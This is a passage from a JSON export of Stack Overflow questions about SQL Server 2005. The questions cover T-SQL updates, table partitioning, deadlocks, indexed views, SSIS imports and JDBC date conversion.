instead)</li>\n</ul>\n\n<p>My experience seems to contradict the link below, which actually makes logical sense to me.</p>\n\n<p><a href=\"http://stackoverflow.com/questions/7175044/updated-data-in-database-is-not-visible-via-jpa-eclipselink\">Updated data (in Database) is not visible via JPA/Eclipselink</a></p>\n\n<p>Many thanks</p>\n\n<p>NaP</p>\n"},{"tags":["sql-server-2005","jsp","ip","internet","jtds"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":22,"score":0,"question_id":12275616,"title":"Can remote server connect with the client through internet and IP?","body":"<p>Can remote server connect with the client through internet and IP?\nOur server is in one building and want to be accessed by the client in the other building which is 100 feet distant from the 1st building. I am using applications JSP, SQL server 2005, tomcat server and jtds.<br>\nHow can I do this?\nPlease help me.</p>\n"},{"tags":["sql-server","sql-server-2008","sql-server-2005","database-design"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":168,"score":1,"question_id":11802429,"title":"\"Prevent saving changes that require the table to be re-created\" negative effects","body":"<p>I was modifying a column in SQL Server 2008 today, changing the datatype from something like currency(18,0) to (19,2).  </p>\n\n<p>I got the usual error \"The changes you have made require the following tables to be dropped and re-created\" from SQL Server. </p>\n\n<p>I know there is the option in Tools-> Options -> Designer -> Table and Database Designers -> Uncheck the box Prevent saving changes that require table re-creation, but...</p>\n\n<p>My question is this : are there any negative effects / possible drawbacks of doing this? Does the table actually get dropped and recreated automatically when this box is unchecked, and if so, is the new table a 100% exact copy of the old one?</p>\n\n<p>Thanks!</p>\n"},{"tags":["tsql","sql-server-2005","merge"],"answer_count":1,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":61,"score":0,"question_id":12269817,"title":"Update any column in target table with corresponding non-null source field","body":"<p>This is probably a familiar problem but i didn't find an answer in searches.  I do have a solution (shown below) that involves COALESCE on every non-key column, I'm wondering if there's a Dynamic TSQL routine, or perhaps a different way of forumulating the query that doesn't involve explicitly naming all the columns.  </p>\n\n<p>I have two tables, \"targetTable\" and \"deltaTable\", that have a the same field names and types.  Both have a unique key, \"id\". </p>\n\n<p>Deltatable has data that has changed for a corresponding row in targetTable.  Any column where the value hasn't changed is null.  I want to update the columns in the targetTable that have non-null values in the corresponding row of the deltaTable.  DetlaTable.id is guaranteed to exist in TargetTable.id, and I never want to update a field to NULL.</p>\n\n<p>I'm using SQL Server 2005 (which doesn't have the merge statement, not that I know it would help).</p>\n\n<p>So if a targetTable row looks like</p>\n\n<pre><code>  id | name    |  dob        | next_appt\n  5    Bill       1-1-2012   | 3-3-2015\n</code></pre>\n\n<p>and a deltaTable row looks like</p>\n\n<pre><code>  id | name     | dob        | next_appt\n  5  | NULL     | NULL       | 4-4-2015\n</code></pre>\n\n<p>I want targetTable updated to </p>\n\n<pre><code>  id | name    |  dob        | next_appt\n  5    Bill       1-1-2012   | 4-4-2015\n</code></pre>\n\n<p>What I have now that I want to improve on is:</p>\n\n<pre><code>UPDATE target\nSET target.colA = COALESCE(delta.colA, target.colA),\n    target.colN = COALESCE(delta.colN, target.colN)\nFROM  delta JOIN target on delta.id = target.id\n</code></pre>\n"},{"tags":["sql","sql-server-2008","tsql","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":54,"score":1,"question_id":12270737,"title":"TSQL - ROUND price to .05 and .09. UPDATE is producing NULLs?","body":"<p>I have a table, PriceTable, </p>\n\n<p>columns UPC (int), Price (money)</p>\n\n<p>I am trying to round all of the cents in the Price column, to end in either .x5 or .x9. </p>\n\n<p>If the last digit of the price is 0-5, then the last digit should be a 5.<br>\nIf the last digit of the price is 6-9, then the last digit should be a 9. \n<br>\nExamples<br><ul><li>1.00 goes to 1.05</li><li>1.21 goes to 1.25</li><li>1.26 goes to 1.29</li></ul></p>\n\n<p>I am using the following, but after the update, I am getting some records where the price is being updated to NULL and I can't figure out why. It is working correctly for 95% of the data, but I can't see anything different with the data where it isn't. </p>\n\n<p>My thinking was the (Round(Price,1,2) gives me the dollar in the Price. Subtract that from the overall Price to get the cents and then use the CASE statement add the correct .05 or .09 back to the Price. </p>\n\n<pre><code>UPDATE PriceTable\nSET Price = ROUND(Price,1,2) + \nCASE \nWHEN Price -(ROUND(Price,1,2)) BETWEEN .00 AND .05 THEN .05\nWHEN Price -(ROUND(Price,1,2)) BETWEEN .06 AND .09 THEN .09\nEND;\n</code></pre>\n\n<p>Is there a better way to do this? I can't wrap my head around why I would get a NULL for Price when all cent scenarios should be accounted for and even if they weren't, I should still get the dollar amount of price with the ROUND(Price,1,2). I shouldn't need an ELSE as there shouldn't be any other conditions. </p>\n\n<p>Thanks, </p>\n\n<p>Marshall</p>\n"},{"tags":["sql-server","sql-server-2005","synchronization"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":398,"score":0,"question_id":881099,"title":"synchronize two sql server 2005","body":"<p>I need to synchronize two sql server 2005 instances between intranet and extranet (through a firewall). Synchronization will be initiated from the intranet. What solutions do I have at my disposal?</p>\n\n<p>intranet db: table t1 -> extranet db: table t1</p>\n\n<p>intranet db: table t2 &lt;- extranet db: table t2</p>\n\n<p>i.e. intranet t1 content should be pushed out to extranet t1 \nand intranet t2 content should be fetched from extranet t2.</p>\n\n<p>We intend to sync every hour.</p>\n"},{"tags":["sql-server-2005","documentation","ssis"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":374,"score":1,"question_id":886589,"title":"Inline documentation for SSIS packages","body":"<p>Is there a way to create an inline documentation (like javadocs) for SSIS packages? Or what other techniques do you use to document the things you develop for SQL Server 2005? </p>\n"},{"tags":["c#","asp.net","sql-server-2005","c#-2.0"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":4,"view_count":97,"score":-4,"question_id":12142164,"title":"How to find a number is within some specified range or not","body":"<p>I have inserted data in database like:</p>\n\n<pre><code>Name  Range\n\nFan   1-100\nTable 40-400\nTest  50-500\n</code></pre>\n\n<p>Now I want to select range like if user enters  Range Value = 45......\nIt should return first and second row. </p>\n\n<p>Thanks in advance</p>\n"},{"tags":["sql","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":81,"score":0,"question_id":12264602,"title":"How do check if a parameter is empty or null in Sql Server stored procedure in IF statement?","body":"<p>I read this: <a href=\"http://stackoverflow.com/questions/334108/how-do-i-check-if-a-sql-server-string-is-null-or-empty\">How do I check if a Sql server string is null or empty</a> but it not helped me in this situation.</p>\n\n<p>The piece of code from my stored procedure:</p>\n\n<pre><code>IF (@item1 IS NOT NULL) OR (LEN(@item1) &gt; 0)\n        SELECT @sql = 'SELECT * FROM TEST1'\n    ELSE\n        SELECT @sql = 'SELECT * FROM TEST2'\n PRINT @sql;\n</code></pre>\n\n<p><code>@item1</code> is <code>NVARCHAR(1000)</code> type.</p>\n\n<p>When execute this stored procedure, I provided the value for <code>item1</code></p>\n\n<pre><code>EXEC    [dbo].[my_proc]\n        @item1 = N''\n</code></pre>\n\n<p>it shows</p>\n\n<p><code>SELECT * FROM TEST1</code> // it is correct if <code>@item1 = N'some'</code></p>\n\n<p>instead of</p>\n\n<p><code>SELECT * FROM TEST2</code></p>\n\n<p>It is somewhere a function in sql to verify if a string is null or empty <strong>OR</strong> I made somewhere a mistake ?</p>\n\n<p>Like in C# -> <code>string.IsNullOrEmpty(myValue)</code></p>\n"},{"tags":["c#","sql-server-2005","ado.net"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":1236,"score":2,"question_id":1242993,"title":"What does Trusted = yes/no mean in Sql connection string?","body":"<p>What does Trusted = yes/no mean in Sql connection string?</p>\n\n<p>I am creating a connection string as below :</p>\n\n<pre><code>            string con= string.Format(\n                \"user id=admin;password=admin;server={0};Trusted_Connection=yes;database=dbtest;connection timeout=600\",\n                _sqlServer);\n</code></pre>\n\n<p>Please Help</p>\n"},{"tags":["sql-server","sql-server-2005","ssis","etl"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":173,"score":0,"question_id":12259732,"title":"Import Latest csv file in a folder - SSIS","body":"<p>I want to import the latest csv file into a table using SSIS? I currently have a step that gets the last file in a folder:   </p>\n\n<pre><code> Report_201209030655.csv\n Report_201209030655.csv\n Report_201209030655.csv\n</code></pre>\n\n<p>Based on created time I want steps to import data of the latest csv to a table.</p>\n"},{"tags":["sql","sql-server","tsql","sql-server-2005","indexed-view"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":192,"score":1,"question_id":1846509,"title":"Error creating indexed view","body":"<p>I have problem with a counting column in my view.</p>\n\n<pre><code>SELECT ColumnC, ColumnA % ColumnB AS ModuloColAColB, COUNT_BIG(*) AS cBig FROM dbo.T1\nGROUP BY ColumnC, ModuloColAColB \n</code></pre>\n\n<p>Query is similar to this MSDN example:\n<a href=\"http://msdn.microsoft.com/en-us/library/ms191432.aspx\" rel=\"nofollow\">http://msdn.microsoft.com/en-us/library/ms191432.aspx</a></p>\n\n<p>When I try to compile view I received error message like: \n\"invalid column name ModuloColAColB\" </p>\n\n<p>So I change group by column names: </p>\n\n<pre><code>SELECT ColumnC, ColumnA % ColumnB AS ModuloColAColB,\nCOUNT_BIG(*) AS cBig FROM dbo.T1\nGROUP BY ColumnC, ColumnA, ColumnB\n</code></pre>\n\n<p>View is compiling correctly but when I try to add index I receive the error: </p>\n\n<pre><code>\"Cannot create the clustered index 'px_test' on view 'l' because the select list of the view contains an expression on result of aggregate function or grouping column.\nConsider removing expression on result of aggregate function or grouping column from select list\"\n</code></pre>\n\n<p>When I remove \" ColumnA % ColumnB AS ModuloColAColB\" all works fine.</p>\n\n<p>Database version: SQL server 2005 Enterprise Edition. </p>\n"},{"tags":["sql-server-2008","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":37,"score":0,"question_id":12257226,"title":"how to copy table data from sql server 2008 to sql server 2005 db?","body":"<p>does anyone know how to copy data from a sql server 2008 db to an sql server 2005 db? I tried to use the sql server export wizard to no avail:(</p>\n"},{"tags":["sql-server","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":41,"score":1,"question_id":12257234,"title":"Change From Clause based on a condition","body":"<p>I have a stored procedure which has more than 2000 lines of code .I need to change the table names in <code>from clause</code> based on a condition .The column names will remain same in both the tables .</p>\n\n<p>For example:- </p>\n\n<pre><code>   Declare @condition char(1)\n   set @condition=(Select close_flg from log \n                   where  last_run_dt &gt;= \n                  (Select  cur_dt from dt) \n                  )\n\n  --If @condition is 'A' then below sql will execute\n\n   Select a.columnA,\n        Case \n         when  @condition='A' then  'D'\n         Else 'M'\n         END,\n         b.ColumnC\n   from TableA as a\n   inner join TableB as b\n   on a.Column=b.Column\n</code></pre>\n\n<p>Now if @condition is 'B' then i need to change the sql as \n(Only the inner join is different rest all the columns in the select query are same )</p>\n\n<pre><code>   Select \n   -- the same columns as above \n   from TableC as c\n   inner join TableD as d\n   on c.Column=d.Column\n</code></pre>\n\n<p>I want to make my SQL generic to reduce the duplicate code .Is it even possible to do so .</p>\n\n<p>Thanks</p>\n"},{"tags":["sql-server","sql-server-2005","deadlock"],"answer_count":2,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":77,"score":3,"question_id":12253685,"title":"SQL Server deadlock clarity?","body":"<p>After reading <a href=\"http://blogs.msdn.com/b/sqlserverstorageengine/archive/2006/06/05/617960.aspx\" rel=\"nofollow\"><strong>this</strong></a> interesting article I have some questions.</p>\n\n<p>This table shows a deadlock situation : </p>\n\n<p><img src=\"http://i.stack.imgur.com/amkoW.jpg\" alt=\"enter image description here\"></p>\n\n<blockquote>\n  <p>T1 holds X lock on all rows with c1=5 on table t_lock1 while T2 holds\n  X lock on all rows with C1=1 on table t_lock2. </p>\n  \n  <p>Now each of these transactions wants to update the rows previously\n  locked by the other. This results in a deadlock.</p>\n</blockquote>\n\n<p>Question #1</p>\n\n<ul>\n<li>Do transactions obtain locks? I know that <em>reading</em> from table is done by a <em>shared</em> lock, and <em>write</em> to a table is done using an <em>exclusive</em> lock (I'm talking about the <em>default</em> locking settings).</li>\n</ul>\n\n<p>So it seems from this example that transaction <em>also</em> holds a lock ....is it correct?</p>\n\n<p>Question #2</p>\n\n<blockquote>\n  <p>...T1 holds X lock on all rows with c1=5 on table t_lock1...</p>\n</blockquote>\n\n<ul>\n<li>IMHO as I've said the locking is not per row (although it can be made, but the author didn't mentioned it) - so why does he say : <em>on all rows with C1=5</em> ?</li>\n</ul>\n"},{"tags":["sql-server","sql-server-2005"],"answer_count":1,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":215,"score":3,"question_id":9586254,"title":"How can I query for the server default settings for ARITHABORT, ANSI WARNINGS and ARITHIGNORE?","body":"<p>I need to query SQL Server and determine the server defaults for ARITHABORT, ANSI WARNINGS and ARITHIGNORE. What's the best way to do this?</p>\n"},{"tags":["sql-server-2005"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":60,"score":0,"question_id":12237543,"title":"SQL Server 2005 complex query for weighted percentage","body":"<p>I've been asked to provide the ability to report the completeness of a Task by a weighted percentage.</p>\n\n<p>Sample schema in SQL Server 2005:</p>\n\n<p>[I'm too new to post an image. Here are the basics]:</p>\n\n<pre><code>Task\n--------\nTaskID   | uniqueidentifier\nTaskName | varchar(50)\n\nTaskItem\n-----------\nTaskID        | uniqueidentifier\nItemID        | uniqueidentifier\nDateCompleted | datetime\n\nItem\n-----------\nItemID         | uniqueidentifier\nItemCategoryID | int\nItemName       | varchar(50)\nWeight         | tinyint\n\nItemCategory\n--------\nItemCategoryID   | uniqueidentifier\nItemCategoryName | varchar(50)\nWeight           | tinyint\n</code></pre>\n\n<p>A Task may consist of one or more Items, each of which is of a given ItemCategory. Both Item and ItemCategory are weighted for how much they add to the overall effort. They are weighted from 1 to 5.</p>\n\n<p>I have achieved this with a combination of Functions which I am not proud of, but it gets the job done - rather slowly. My SQL query writing skills are not the best.</p>\n\n<p>dbo.WeightItemTotal</p>\n\n<p>dbo.WeightCompletedItems</p>\n\n<p>dbo.WeightCategoryTotal</p>\n\n<p>dbo.PercentItemComplete</p>\n\n<p>dbo.PercentTaskComplete(TaskID)</p>\n\n<p>I use a couple of them to calculate a PercentItemComplete, then use it calculate a PercentTaskComplete. It's a lot of code to post here and works ok, at any rate.</p>\n\n<p>For around 2000 Tasks, it takes about 5 seconds to run dbo.PercentTaskComplete. Using dbo.PercentTaskComplete in a View along with a bunch of other related tables and fields all add up to an 18 second wait for these records.</p>\n\n<p>I'm looking for a single query to accomplish the same, if possible, with the expectation that the performance can be bettered.</p>\n\n<p>Is this a trivial task for an expert? I don't know, but I hope someone can help me out with some advice.</p>\n\n<p><em><strong>[Edit]:</em></strong></p>\n\n<p>Important Correction: Weight can be an integer from 0 to 5.</p>\n\n<p>Script to insert data:</p>\n\n<pre><code>USE PercentageTest\n\nINSERT INTO dbo.Task (TaskName) VALUES('BRX 2012 Project')\nINSERT INTO dbo.Task (TaskName) VALUES('BRX 2013 Project')\n\nINSERT INTO dbo.ItemCategory (ItemCategoryName, Weight) VALUES('Documentation', 1)\nINSERT INTO dbo.ItemCategory (ItemCategoryName, Weight) VALUES('Planning', 2)\n\nINSERT INTO dbo.Item (ItemCategoryID, ItemName, Weight)\nSELECT ItemCategoryID, 'Drawings', 1\nFROM ItemCategory WHERE ItemCategoryName = 'Documentation' UNION\nSELECT ItemCategoryID, 'Engineering Specifications', 3\nFROM ItemCategory WHERE ItemCategoryName = 'Documentation' UNION\nSELECT ItemCategoryID, 'Field Review of Scope of Work', 4\nFROM ItemCategory WHERE ItemCategoryName = 'Planning' UNION\nSELECT ItemCategoryID, 'Markup Plot Plan With Scope', 0\nFROM ItemCategory WHERE ItemCategoryName = 'Planning'\n\nINSERT INTO dbo.TaskItem (TaskID, ItemID, DateCompleted)\nSELECT TaskID, (SELECT ItemID FROM dbo.Item WHERE ItemName = 'Drawings'), '01/01/2012'\nFROM Task WHERE TaskName = 'BRX 2012 Project' UNION\nSELECT TaskID, (SELECT ItemID FROM dbo.Item WHERE ItemName = 'Engineering Specifications'), '01/01/2012'\nFROM Task WHERE TaskName = 'BRX 2012 Project' UNION\nSELECT TaskID, (SELECT ItemID FROM dbo.Item WHERE ItemName = 'Field Review of Scope of Work'), NULL\nFROM Task WHERE TaskName = 'BRX 2012 Project' UNION\nSELECT TaskID, (SELECT ItemID FROM dbo.Item WHERE ItemName = 'Markup Plot Plan With Scope'), '01/01/2012'\nFROM Task WHERE TaskName = 'BRX 2012 Project' UNION\nSELECT TaskID, (SELECT ItemID FROM dbo.Item WHERE ItemName = 'Drawings'), NULL\nFROM Task WHERE TaskName = 'BRX 2013 Project' UNION\nSELECT TaskID, (SELECT ItemID FROM dbo.Item WHERE ItemName = 'Engineering Specifications'), NULL\nFROM Task WHERE TaskName = 'BRX 2013 Project' UNION\nSELECT TaskID, (SELECT ItemID FROM dbo.Item WHERE ItemName = 'Field Review of Scope of Work'), '01/01/2012'\nFROM Task WHERE TaskName = 'BRX 2013 Project' UNION\nSELECT TaskID, (SELECT ItemID FROM dbo.Item WHERE ItemName = 'Markup Plot Plan With Scope'), NULL\nFROM Task WHERE TaskName = 'BRX 2013 Project'\n\n\n--DELETE FROM TaskItem\n--DELETE FROM Item\n--DELETE FROM Task\n--DELETE FROM ItemCategory\n</code></pre>\n\n<p>In addition to the function collection in the backend, we have modeled the calculation for TaskPercentComplete in our Task entity as a Property named PercentComplete. Hopefully this sheds some light on the route I take to calculate how far along a Task is to completeness, because it is a bit difficult and probably distracting to simply lay it all out in text:</p>\n\n<pre><code>    Public ReadOnly Property PercentComplete As Double\n    Get\n        Dim SumOfCategoryWeight = Me.ItemCategories.Where(Function(c) c.Weight &gt; 0).Sum(Function(c) c.Weight)\n        Dim CategoryWeightMultiplier = If(SumOfCategoryWeight &gt; 0, 100 / SumOfCategoryWeight, 0.0)\n        Dim SumOfItemWeight = Me.Items.Where(Function(i) i.Weight &gt; 0).Sum(Function(i) i.Weight)\n        Dim SumOfCompletedItemWeight = Me.TaskItems.Where(Function(ti) ti.DateCompleted.HasValue).Sum(Function(ti) ti.Item.Weight)\n        Dim PercentItemComplete = If(SumOfItemWeight &gt; 0, 100 / SumOfItemWeight, 0.0) * SumOfCompletedItemWeight\n        Dim PercentTaskComplete As Double\n\n        For Each c In Me.ItemCategories\n            PercentTaskComplete += ((PercentItemComplete / 100) * CategoryWeightMultiplier) * c.Weight\n        Next\n\n        Return PercentTaskComplete\n    End Get\nEnd Property\n</code></pre>\n\n<p>Essentially, per Task:</p>\n\n<p>I sum the weight of all ItemCategories (again, per Task) which are greater than zero. If that sum is greater than zero, using floating point division, I divide that sum into 100 to obtain a multiplier. If not, the multiplier = 0.</p>\n\n<p>Then I get the sum of the weight of all Items which are greater than zero and the sum of the weight of all completed Items.</p>\n\n<p>I get PercentItemComplete by dividing the sum of Item weights into 100, multiplying it by the sum of the weight of completed Items (those which have a value for DateCompleted).</p>\n\n<p>Then for each ItemCategory in use by a given Task, I calculate a value equal to PercentItemComplete divided by 100 times the CategoryWeightMultiplier times the weight of the category.</p>\n\n<p>PercentTaskComplete is the sum of each of the values in the loop.</p>\n\n<p>That's a mouthful. At any rate, the above formula applied to the inserted data yields these results:</p>\n\n<p>Task 'BRX 2012' percent complete = 50</p>\n\n<p>Task 'BRX 2013' percent complete = 50</p>\n\n<p>Those categories or items which have zero weight are discarded by the formula; whether completed or not, they do not affect the overall percent complete. They are in place only to serve as \"weightless\" reminders for the person planning the Task.</p>\n\n<p>I hope this is enough (and not too much) information.</p>\n"},{"tags":["asp.net","sql-server-2008","sql-server-2005","c#-4.0"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":137,"score":2,"question_id":12250645,"title":"asp.net displaying stored procedure results on HtmlTable from codebehind","body":"<p>what is the best way to dynamically create a table from codebehind, where data for it is retrieved from a stored procedure (SQL 2008)??\nAnd will it make difference if I use HtmlTable instead of asp.net Table?\nAppreciate the help!</p>\n"},{"tags":["sql-server","sql-server-2008","sql-server-2005","sql-server-2008-r2","sql-server-2000"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":83,"score":0,"question_id":12245034,"title":"Case not working in Exists in Sql Server","body":"<p>I have a scenario where i have to check a variable for it's default value, and if it has i have to check EXISTS part conditionally with Table2 and if it does not have the default value, i have to check EXISTS part conditionally with Table3.</p>\n\n<p>Below is a sample code:-</p>\n\n<pre><code>SELECT * FROM tbl1 WHERE EXISTS (SELECT CASE WHEN @boolVar = 0 THEN (SELECT 'X' FROM tbl2 WHERE tbl1.col1 = tbl2.col1) ELSE (SELECT 'X' FROM tbl3 where tbl1.col1 = tbl3.col1) END)\n</code></pre>\n\n<p>Demo query with constants for testing purpose: - </p>\n\n<pre><code>SELECT 1 WHERE EXISTS (SELECT CASE WHEN 1 = 0 THEN (SELECT 'X' WHERE 1=0) \n    ELSE (SELECT 'X' WHERE 1 = 2) END)\n</code></pre>\n\n<p>Note: - The above query always returning 1, even not a single condition is satisfying.</p>\n\n<p>I know we can use OR operator for the same and any how we can achieve it, but i really want to know that in case both the tables have no rows satisfying their particular where clause, even it's returning all the rows from Table1.</p>\n\n<p>I tried to explain the same with the demo query with constant values.</p>\n\n<p>Please help.</p>\n"},{"tags":["sql-server","sql-server-2005","alter-table","database-partitioning"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":356,"score":1,"question_id":996277,"title":"Why would 'alter table switch partition' fail silently?","body":"<p>I have a partitioned fact table on a SQL Server 2005 (Ent, Ed., 32 bit, SP2) that I am constructing a partition for (the fact table is a snapshot type).  The process builds the data in a separate table, applies appropriate indexes and then switches the partition into the table.</p>\n\n<ol>\n<li><p>This has worked in the past</p></li>\n<li><p>The table structures are identical and the command raises no errors.  If you drop one of the indexes it will raise an error complaining about that.</p></li>\n</ol>\n\n<p>For some reason the command to switch the partition raises no errors but fails silently.  I cannot see why this might be the case.  </p>\n\n<p>For example,</p>\n\n<pre><code>alter table wk.FactRIAgedDebt\n      switch partition 12\n      to fact.RIAgedDebt partition 12\n</code></pre>\n\n<p>Runs, with SSMS reporting '<code>Command (s) completed successfully.</code>' but running something such as <code>select count (*) from fact.RIAgedDebt</code> returns 0 rows.  The source table <code>wk.FactRIAgedDebt</code> still has the data in it.</p>\n\n<ul>\n<li>Is it a known bug?</li>\n<li>Am I doing something obvious wrong?</li>\n<li>Has anyone seen this phenomenon before?</li>\n</ul>\n"},{"tags":["sql","sql-server-2005","table","database-partitioning"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":2268,"score":0,"question_id":460942,"title":"Partitioning in SQL Server 2005","body":"<p>I have some questions about partitioning and strategy, how and when to use it. As I understood from <a href=\"http://msdn.microsoft.com/en-us/library/ms345146.aspx#sql2k5parti_topic1\" rel=\"nofollow\">Partitioned Tables and Indexes in SQL Server 2005</a>, partitioning is not used only for manageability but also to improve performance on very large database tables (VLDB). We have a table with millions of records. This table store performance data, for example how many times was specified item be clicked and so on. We need evaluate this data for current month in real application on daily basis. What I want to prevent is to move data from one table to another, only because of performance.\nMy idea was: I create partition on this VLDB by month for current year. Then I would create clustered index on date field of table and partition scheme. I dont know if I understand it correctly, but what I except is, that index will be created per partition separately.</p>\n\n<p>Generally how my code looks like in development phase.</p>\n\n<pre><code>/*\nMaybe it looks like complicated, but instead of static upper bound, \nI use function to determine end of the month for the current year.\n\nSo for example (executed in year 2009)\n    SELECT DATEADD(ms, -2, DATEADD(month,((DATEPART(YEAR, GetDate())-1901)*12)+1-1,31-1)) \nreturns \n    2008-01-30 23:59:59.997\n*/\nCREATE PARTITION FUNCTION PartitionMonthlyCurrentYear(DATETIME) AS\nRANGE LEFT FOR VALUES\n(\n    DATEADD(ms, -2, DATEADD(month,((DATEPART(YEAR, GetDate())-1901)*12)+1-1,31-1)),\n    DATEADD(ms, -2, DATEADD(month,((DATEPART(YEAR, GetDate())-1900)*12)+1-1,31-1)),\n    DATEADD(ms, -2, DATEADD(month,((DATEPART(YEAR, GetDate())-1900)*12)+2-1,31-1)),\n    DATEADD(ms, -2, DATEADD(month,((DATEPART(YEAR, GetDate())-1900)*12)+3-1,31-1)),\n    DATEADD(ms, -2, DATEADD(month,((DATEPART(YEAR, GetDate())-1900)*12)+4-1,31-1)),\n    DATEADD(ms, -2, DATEADD(month,((DATEPART(YEAR, GetDate())-1900)*12)+5-1,31-1)),\n    DATEADD(ms, -2, DATEADD(month,((DATEPART(YEAR, GetDate())-1900)*12)+6-1,31-1)),\n    DATEADD(ms, -2, DATEADD(month,((DATEPART(YEAR, GetDate())-1900)*12)+7-1,31-1)),\n    DATEADD(ms, -2, DATEADD(month,((DATEPART(YEAR, GetDate())-1900)*12)+8-1,31-1)),\n    DATEADD(ms, -2, DATEADD(month,((DATEPART(YEAR, GetDate())-1900)*12)+9-1,31-1)),\n    DATEADD(ms, -2, DATEADD(month,((DATEPART(YEAR, GetDate())-1900)*12)+10-1,31-1)),\n    DATEADD(ms, -2, DATEADD(month,((DATEPART(YEAR, GetDate())-1900)*12)+11-1,31-1)),\n    DATEADD(ms, -2, DATEADD(month,((DATEPART(YEAR, GetDate())-1900)*12)+12-1,31-1))\n);\n\n/*\nCreate scheme on the primary file group. I'm aware about performance issues of this.\n*/\nCREATE PARTITION SCHEME SchemeMonthlyCurrentYear \nAS PARTITION PartitionMonthlyCurrentYear\nALL TO ([PRIMARY]);\n\n/*\nCreate clustered index on table and scheme\n*/\nCREATE CLUSTERED INDEX [IX_Log_Seiten_archive_Datum] ON [dbo].[Log_Seiten_archiv] \n(\n    [Datum] DESC\n)ON SchemeMonthlyCurrentYear(Datum)\nGO\n</code></pre>\n\n<p>My questions:</p>\n\n<ol>\n<li>What you think about this approach?</li>\n<li>How can I remove table from\nspecified partition scheme? If I drop index, still cant drop scheme and function because there is still dependency on table *Log_Seiten_archiv*</li>\n<li>How can I assign table to use different partition function? Because of development I need often change how partitions function is defined, or create new one. How can I do this for existing table? For example I want change year on function I showed before.</li>\n</ol>\n\n<p>Regards\nAnton Kalcik</p>\n"},{"tags":["sql","sql-server-2005","database-partitioning"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":257,"score":1,"question_id":3298682,"title":"Sql Server 2005 - Add partition scheme to a non partitioned table","body":"<p>I have a table that has more than 50 million records and which does not have any\npartition. But now i want to add a partition scheme to this table. This table has a primary key. But i want to partition it using another int column. How can i do it?</p>\n"},{"tags":["sql","sql-server-2005","database-partitioning"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":373,"score":2,"question_id":5103723,"title":"Rule of thumb when to partition tables","body":"<p>I've seen many entries about partitioning tables, but there is not a lot of information on when you should make a partition.</p>\n\n<p>Is there a rule of thumb when you should partition tables in SQL Server. </p>\n\n<p>Thanks</p>\n"},{"tags":["java","sql-server-2005","jdbc"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":83,"score":0,"question_id":12242667,"title":"How to convert String to datetime in the SQL query?","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/10494528/tsql-datetime-from-character-string-error\">TSQL: datetime from character string error</a>  </p>\n</blockquote>\n\n\n\n<p>I am unable to convert String to datetime. I am using SQL Server 2005.</p>\n\n<pre><code>String frmDate=\"03/09/2012\";\nString toDate=\"04/09/2012\";\n\nSimpleDateFormat formater = new SimpleDateFormat(\"dd/MM/yyyy\");\nDate frmDate1 = formater.parse(frmDate);\nDate toDate1=formater.parse(toDate);\n\n\n String query3=\"select * from dbo.Monthly_PFSPL \"  +  \n    \"where Convert (datetime,Added_Date,103) \"  +  \n\"between '\"+frmDate1+\"' and '\"+toDate1+\"' \";\n        rsobj1=stat2.executeQuery(query3);\n</code></pre>\n\n<p>I am getting this exception:</p>\n\n<pre><code>java.sql.SQLException: Conversion failed when converting datetime from character string\n</code></pre>\n"},{"tags":["c#","sql-server-2005","serialization","dataset","bytearray"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":147,"score":0,"question_id":12247809,"title":"convert large dataset to bytes array using C#?","body":"<p>I am able to convert dataset to bytes array using <a href=\"http://vbcity.com/forums/t/111506.aspx\" rel=\"nofollow\">this link</a> and this code:</p>\n\n<pre><code>System.IO.MemoryStream stream = new System.IO.MemoryStream();\nSystem.Runtime.Serialization.IFormatter formatter = new System.Runtime.Serialization.Formatters.Binary.BinaryFormatter();\nformatter.Serialize(stream, dtUsers); // dtUsers is a DataTable\n\nbyte[] bytes = stream.GetBuffer(); \n</code></pre>\n\n<p>But the system taking it's toll lot memory , freezing when resultset  returning 500000 or more records.Is there any better way to accomplish the same with one shot.Any help would be appreciated.Database is SQL Server 2005 and VS 2008 for C#.</p>\n"},{"tags":["sql-server-2005","database-restore","transaction-log"],"answer_count":3,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":2628,"score":2,"question_id":4249592,"title":"How do I undo an update statement I made to a database","body":"<p>It's a test environment, I needed some data to test an Update query, but accidentally updated a column in all rows to have wrong data. Must I use a backup to restore the data back to the previous instance, or is there some secret with transaction log that I can take advantage of?</p>\n\n<p>Thanks in advance. </p>\n"},{"tags":["sql-server-2005","data","filesystems","archive"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":32,"score":0,"question_id":12243262,"title":"Archiving Sql data into file System","body":"<p>I have a sql database, need to archive the database into filesystem(excel 